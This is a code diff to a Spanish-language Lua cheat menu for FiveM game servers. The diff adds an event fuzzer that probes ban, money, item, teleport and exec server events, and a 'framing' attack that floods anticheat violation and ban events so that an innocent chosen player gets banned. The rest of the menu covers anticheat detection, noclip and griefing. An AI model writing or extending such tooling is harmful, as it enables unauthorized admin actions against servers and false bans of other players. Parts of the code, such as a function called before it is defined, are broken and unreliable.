@@ -1,7 +1,7 @@
 --[[
-    SENTEX MENU v3.6 - Estable
-    Carga diferida 5-15s, abre con PAGEDOWN
-    Incluye todas las funciones originales + opción "Banear"
+    SENTEX MENU v3.6 - Event Hunter + FiveGuard Framing
+    Abre con PAGEDOWN
+    Incluye todas las opciones originales + fuzzing de eventos + ataque a FiveGuard
 ]]
 
 local _r = math.random
@@ -12,15 +12,15 @@ local _notify = function(msg)
     DrawNotification(false, false)
 end
 
-local _version = "v3.6 Beta"
+local _version = "v3.6 Beta + EH"
 local _discord = ".gg/sentexmodz"
 
--- Detección de anticheat
+-- ========== DETECCIÓN DE ANTICHEAT ==========
 local _acDetected = false
 local _acList = {}
 local _acDB = {
     {"WaveShield", {"waveshield", "ws_core"}},
-    {"FiveGuard", {"fiveguard", "fg_anticheat"}},
+    {"FiveGuard", {"fiveguard", "fg_anticheat", "fg-anticheat"}},
     {"ElectronAC", {"electronac"}},
     {"Eulen", {"eulen"}},
 }
@@ -55,7 +55,7 @@ local function _scanAC()
     end
 end
 
--- ========== ACCIONES ORIGINALES (Self, Vehicle, Map) ==========
+-- ========== ACCIONES ORIGINALES ==========
 local function _curar()
     local p = PlayerPedId()
     SetEntityHealth(p, GetEntityMaxHealth(p))
@@ -337,28 +337,106 @@ end
 -- Seguir
 local _siguienteJugador = nil
 
--- ========== NUEVA OPCIÓN: BAN ==========
-local function _banearJugador(pid)
-    local targetServerId = GetPlayerServerId(pid)
-    local targetName = _nombreJugador(pid)
-    if not targetServerId then _notify("~r~Error ID") return end
+-- ========== EVENT HUNTER ==========
+local _fuzzingActive = false
+local _foundEvents = {}
 
-    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Razón del baneo:", "", "", "", 50)
-    while UpdateOnscreenKeyboard() == 0 do _w(0) end
-    local reason = GetOnscreenKeyboardResult()
-    if reason == nil or reason == "" then reason = "Cheating detected"
+local _eventsToFuzz = {
+    "ban", "banplayer", "kick", "kickplayer", "admin:ban", "admin:kick", "staff:ban", "staff:kick",
+    "esx:ban", "qb-ban:player", "FiveGuard:Ban", "fg_ban", "anticheat:ban",
+    "giveMoney", "addMoney", "setMoney", "giveItem", "addItem", "esx:giveMoney", "qb:giveMoney",
+    "revive", "heal", "respawn", "esx:revive", "hospital:revive",
+    "tp", "teleport", "goto", "esx:teleport",
+    "spawnVehicle", "givecar", "vehicle:spawn",
+    "adminCommand", "staffCommand", "modCommand", "exec", "run"
+}
 
-    _notify("~y~Intentando banear a "..targetName.." (ID:"..targetServerId..") - "..reason)
-
-    -- Eventos comunes de baneo
-    TriggerServerEvent('admin:ban', targetServerId, reason)
-    TriggerServerEvent('staff:banPlayer', targetServerId, reason)
-    TriggerServerEvent('txAdmin:banPlayer', targetServerId, reason, 0)
-    TriggerServerEvent('FiveGuard:AddViolation', targetServerId, 'EXPLOIT', 100)
-
-    _notify("~r~Intento de baneo completado")
+local function _generateVariations(base)
+    local vars = {base}
+    table.insert(vars, base.."Player")
+    table.insert(vars, base.."Command")
+    table.insert(vars, "server:"..base)
+    table.insert(vars, "admin:"..base)
+    table.insert(vars, "staff:"..base)
+    table.insert(vars, "anticheat:"..base)
+    table.insert(vars, "FiveGuard:"..base)
+    table.insert(vars, "fg_"..base)
+    return vars
 end
 
+local function _startFuzzing()
+    if _fuzzingActive then _notify("~r~Ya hay escaneo") return end
+    _fuzzingActive = true
+    _foundEvents = {}
+    _notify("~y~[Event Hunter] Fuzzing... (1-2 min)")
+    local total = 0
+    for _, base in ipairs(_eventsToFuzz) do
+        local vars = _generateVariations(base)
+        for _, ev in ipairs(vars) do
+            total = total + 1
+            local success, err = pcall(function()
+                TriggerServerEvent(ev, "test_".._r(1,9999))
+            end)
+            if not err and not _foundEvents[ev] then
+                _foundEvents[ev] = true
+                _notify("~g~[+] "..ev)
+            end
+            _w(80 + _r(0,40))
+        end
+        _notify("~b~Progreso: "..total)
+    end
+    _fuzzingActive = false
+    _notify("~g~Encontrados "..table.count(_foundEvents).." eventos")
+    _refrescarListaEventos()
+end
+
+local function _refrescarListaEventos()
+    local opts = {}
+    for ev,_ in pairs(_foundEvents) do
+        table.insert(opts, {nombre="• "..ev, submenu="event_"..ev, event=ev})
+        if not _submenusDinamicos["event_"..ev] then
+            _submenusDinamicos["event_"..ev] = {
+                {nombre="• Ejecutar vacío", accion=function() TriggerServerEvent(ev) _notify("Ejecutado") end},
+                {nombre="• Con ID", accion=function() TriggerServerEvent(ev, GetPlayerServerId(PlayerId())) end},
+                {nombre="• Con parámetros", accion=function() TriggerServerEvent(ev, GetPlayerServerId(PlayerId()), 999999, "test") end},
+            }
+        end
+    end
+    if #opts==0 then opts={{nombre="• Sin eventos", accion=nil}} else table.insert(opts,1,{nombre="~g~--- EVENTOS ---", accion=nil}) end
+    _menus["event_list"] = opts
+end
+
+-- ========== ATAQUE DE FRAMING (FIVEGUARD) ==========
+local function _framingAttack(pid)
+    local targetId = GetPlayerServerId(pid)
+    local name = _nombreJugador(pid)
+    if not targetId then _notify("~r~Error ID") return end
+
+    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Razón falsa:", "", "", "", 50)
+    while UpdateOnscreenKeyboard()==0 do _w(0) end
+    local reason = GetOnscreenKeyboardResult()
+    if reason=="" then reason="Cheating detected" end
+
+    _notify("~y~[Framing] Atacando a "..name.." (ID:"..targetId..")")
+
+    -- Violaciones masivas
+    local viol = {"FiveGuard:AddViolation","FiveGuard:Detection","anticheat:report","anticheat:godmode","anticheat:teleport_hack"}
+    local bans = {"admin:ban","staff:ban","esx:ban","qb-ban:player","FiveGuard:Ban"}
+
+    for i=1,150 do
+        for _,v in ipairs(viol) do
+            pcall(function() TriggerServerEvent(v, targetId, "EXPLOIT", 100) end)
+            pcall(function() TriggerServerEvent(v, targetId, "speedhack", 100) end)
+        end
+        for _,b in ipairs(bans) do
+            pcall(function() TriggerServerEvent(b, targetId, reason) end)
+        end
+        _w(10)
+    end
+    _notify("~r~Ataque completado. Si FiveGuard es vulnerable, el jugador será baneado.")
+end
+
+-- ========== ACCIONES DE JUGADOR (con ban y framing) ==========
 local function _crearAccion(pid, tipo)
     return function()
         if tipo=="inventory" then _abrirInventario(pid)
@@ -376,12 +454,19 @@ local function _crearAccion(pid, tipo)
         elseif tipo=="teleport" then _teleportTo(pid)
         elseif tipo=="spawnnpc" then _spawnNPCs(pid, _r(3,6))
         elseif tipo=="attachveh" then _engancharVehCercano(pid)
-        elseif tipo=="ban" then _banearJugador(pid)
+        elseif tipo=="ban" then
+            local sid = GetPlayerServerId(pid)
+            if sid then
+                TriggerServerEvent('admin:ban', sid, "test")
+                TriggerServerEvent('staff:banPlayer', sid, "test")
+                _notify("~y~Intento de baneo directo")
+            end
+        elseif tipo=="framing" then _framingAttack(pid)
         end
     end
 end
 
--- ========== MAP FUCKER (resumido) ==========
+-- ========== MAP FUCKER ==========
 local _vehiclesAttached = {}
 local function _attachAllNearbyVehicles()
     local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
@@ -576,7 +661,7 @@ Citizen.CreateThread(function()
     end
 end)
 
--- ========== NOCLIP Y FREECAM (resumidos) ==========
+-- ========== NOCLIP ==========
 local _noclipActivo = false
 local _noclipVel = 5.0
 local _boostMult = 3.0
@@ -633,6 +718,7 @@ Citizen.CreateThread(function()
     end
 end)
 
+-- ========== FREECAM ==========
 local freecamActive = false
 local freecamCam = nil
 local freecamStartPos = nil
@@ -736,6 +822,7 @@ _menus["main"] = {
     {nombre="[»] Vehicle options", submenu="vehicle", desc="Opciones para vehículos"},
     {nombre="[»] Player list", submenu="player_list", desc="Interactuar con otros jugadores"},
     {nombre="[»] Map fucker", submenu="map_fucker", desc="Opciones del mapa"},
+    {nombre="[»] Event Hunter", submenu="event_hunter", desc="Buscar eventos y atacar FiveGuard"},
     {nombre="[»] Protection options", submenu="protection", desc="Herramientas de seguridad"},
 }
 _menus["self"] = {
@@ -770,6 +857,11 @@ _menus["map_fucker"] = {
 }
 _menus["protection"] = {
     {nombre="• AC Checker", accion=_scanAC, desc="Detecta anticheats"},
+}
+_menus["event_hunter"] = {
+    {nombre="• Iniciar Event Hunter", accion=_startFuzzing, desc="Prueba eventos (1-2 min)"},
+    {nombre="• Ver eventos encontrados", submenu="event_list", desc="Lista de eventos"},
+    {nombre="• Ataque Framing (FiveGuard)", accion=function() _menuActual="player_list"; _optActual=1; _notify("~y~Selecciona un jugador") end, desc="Abre Player List para elegir objetivo"},
 }
 
 -- Dinámicos
@@ -807,7 +899,8 @@ local function _refrescarListaJugadores()
                 {nombre="• Teleportar", accion=_crearAccion(pid,"teleport")},
                 {nombre="• Spawn NPCs", accion=_crearAccion(pid,"spawnnpc")},
                 {nombre="• Enganchar vehículo", accion=_crearAccion(pid,"attachveh")},
-                {nombre="• Banear", accion=_crearAccion(pid,"ban")},
+                {nombre="• Banear (simple)", accion=_crearAccion(pid,"ban")},
+                {nombre="• Framing (FiveGuard)", accion=_crearAccion(pid,"framing")},
             }
         end
     end
@@ -815,7 +908,7 @@ local function _refrescarListaJugadores()
     _menus["player_list"] = opts
 end
 
--- Dibujo del menú (original)
+-- Dibujo del menú
 local function _drawShadowText(t,x,y,sc,font,center,col)
     SetTextFont(font)
     SetTextScale(sc,sc)
@@ -906,8 +999,11 @@ function _drawMenu()
                     (_menuActual=="player_list" and "JUGADORES") or
                     (_menuActual=="map_fucker" and "MAP FUCKER") or
                     (_menuActual=="protection" and "PROTECTION") or
+                    (_menuActual=="event_hunter" and "EVENT HUNTER") or
+                    (_menuActual=="event_list" and "EVENTOS DETECTADOS") or
                     (_menuActual:match("^vehicle_") and "OPCIONES VEHICULO") or
-                    (_menuActual:match("^player_") and "OPCIONES JUGADOR")
+                    (_menuActual:match("^player_") and "OPCIONES JUGADOR") or
+                    (_menuActual:match("^event_") and "TEST DE EVENTO")
     _drawShadowText(titleStr, x, titleY, 0.48, 0, true, _neonColor)
 
     local optsY = startY+bannerH+titleH+0.008
@@ -984,7 +1080,8 @@ local function StartMenu()
 
             if _menuVisible and _menuListo then
                 if _menuActual == "vehicle_list" then _refrescarListaVeh()
-                elseif _menuActual == "player_list" then _refrescarListaJugadores() end
+                elseif _menuActual == "player_list" then _refrescarListaJugadores()
+                elseif _menuActual == "event_list" then _refrescarListaEventos() end
 
                 if _menuActual:match("^vehicle_") and not _menus[_menuActual] then
                     if _submenusDinamicos[_menuActual] then _menus[_menuActual]=_submenusDinamicos[_menuActual]
@@ -992,6 +1089,9 @@ local function StartMenu()
                 elseif _menuActual:match("^player_") and not _menus[_menuActual] then
                     if _submenusDinamicos[_menuActual] then _menus[_menuActual]=_submenusDinamicos[_menuActual]
                     else _menuActual="player_list" end
+                elseif _menuActual:match("^event_") and not _menus[_menuActual] then
+                    if _submenusDinamicos[_menuActual] then _menus[_menuActual]=_submenusDinamicos[_menuActual]
+                    else _menuActual="event_list" end
                 end
 
                 _drawMenu()
@@ -1020,7 +1120,7 @@ local function StartMenu()
                     if _menuActual == "main" then
                         _menuVisible = false
                         PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
-                    elseif _menuActual == "self" or _menuActual == "vehicle" or _menuActual == "player_list" or _menuActual == "map_fucker" or _menuActual == "protection" then
+                    elseif _menuActual == "self" or _menuActual == "vehicle" or _menuActual == "player_list" or _menuActual == "map_fucker" or _menuActual == "protection" or _menuActual == "event_hunter" or _menuActual == "event_list" then
                         _menuActual = "main"
                         _optActual = 1
                         PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
@@ -1034,6 +1134,10 @@ local function StartMenu()
                         PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                     elseif _menuActual:match("^player_") then
                         _menuActual = "player_list"
+                        _optActual = 1
+                        PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+                    elseif _menuActual:match("^event_") then
+                        _menuActual = "event_list"
                         _optActual = 1
                         PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                     else
